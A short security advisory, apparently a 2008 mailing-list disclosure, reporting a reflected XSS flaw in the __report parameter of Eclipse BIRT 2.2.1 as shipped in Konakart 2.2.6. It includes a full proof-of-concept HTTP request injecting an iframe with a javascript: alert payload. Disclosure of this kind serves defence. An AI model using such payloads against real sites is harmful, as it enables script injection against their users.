Subject: [AntiSnatchOr] Eclipse BIRT <= 2.2.1 Reflected XSS

Eclipse BIRT <= 2.2.1 Reflected XSS

Vendor: Eclipse
Advisory: http://antisnatchor.com/2008/12/18/eclipse-birt-reflected-xss/
Author:  Michele "euronymous" OrrÃ¹ (euronymous AT antisnatchor DOT com)

Quite a common problem in a lot of Java based applications: reflected
XSS in Java stack trace.

A Reflected XSS is present in the _report parameter: here below the modified
request (that is the BIRT 2.2.1 version included in Konakart 2.2.6)

GET
/birt-viewer/run?__report='"><iframe%20src=javascript:alert(666)>&r=-703171660
HTTP/1.1
Host: localhost:8780
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18)

Konakart is actually using org.eclipse.birt.core_2.2.1.r22x_v20070924, that is
actually old.
